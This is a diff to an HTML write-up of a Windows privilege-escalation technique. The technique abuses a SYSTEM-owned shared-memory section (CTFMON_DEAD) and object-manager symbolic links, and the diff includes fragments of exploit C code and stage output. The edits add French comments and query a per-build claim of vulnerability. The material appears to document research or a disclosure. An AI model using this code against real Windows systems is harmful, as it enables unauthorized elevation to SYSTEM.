@@ -413,8 +413,8 @@ wsprintf(section_path, L"\\Sessions\\%d\\BaseNamedObjects\\CTFMON_DEAD", sesid);
   <p>With the path fixed, the code opens the SYSTEM-owned section and gets a valid handle. But mapping it with <code>FILE_MAP_WRITE</code> fails. <code>GetLastError()</code> returns 5 (<code>ERROR_ACCESS_DENIED</code>, NT status <code>0xC0000022</code>). The code falls back to read-only and dumps the first 256 bytes:</p>
 
   <div class="code-block">
-    <div class="code-label">stage 6 output on patched builds</div>
-    <pre>[Stage 6] Mapping SYSTEM section into current process...
+    <div class="code-label">Output on patched builds</div>
+    <pre>Mapping SYSTEM section into current process...
   <span style="color:#f87171">[FAIL] NtMapViewOfSection returned 0xC0000022</span>
   <span style="color:#4ade80">[OK]   Section mapped READ-ONLY at 0x0000028FB2E50000 (size: 4096 bytes)</span>
 
@@ -554,12 +554,13 @@ wsprintf(section_path, L"\\Sessions\\%d\\BaseNamedObjects\\CTFMON_DEAD", sesid);
 <span style="color:#52525b">// Rather than aborting, open the existing object and reuse its handle.</span>
 
 if (stat == 0xC0000035) {
+    // Le symlink existe déjà - on essaie de l'ouvrir
     printf("[!] Symlink already exists (0xC0000035)\n");
-    printf("[*] Previous run leaked handle - symlink kept alive by kernel ref count\n");
     printf("[*] Trying NtOpenSymbolicLinkObject on existing entry...\n");
-
+    
+    // Re-initialiser pour l'ouverture
     InitializeObjectAttributes(&amp;objattr, &amp;linksrc, OBJ_CASE_INSENSITIVE, NULL, NULL);
-
+    // Ouvrir le symlink existant
     HANDLE hExistingLink = NULL;
     NTSTATUS openStat = NtOpenSymbolicLinkObject(
         &amp;hExistingLink, GENERIC_ALL, &amp;objattr);
@@ -809,7 +810,7 @@ if (!pMapped) {
     · 26200.8457 (25H2): same<br/>
     · 26200.6584 (25H2 older): same, despite being older than 8037 (not yet explained)<br/>
     · 19045.2965 (Win10 22H2): vulnerable code path absent entirely<br/>
-    · 26200.8037 (25H2): <span style="color:#4ade80">vulnerable, full read/write access confirmed by stevevanasche</span>
+    · 26200.8037 (25H2): <span style="color:#4ade80">vulnerable, full read/write access confirmed by stevevanasche ???</span>
   </div>
 
   <!-- ===================================================== -->
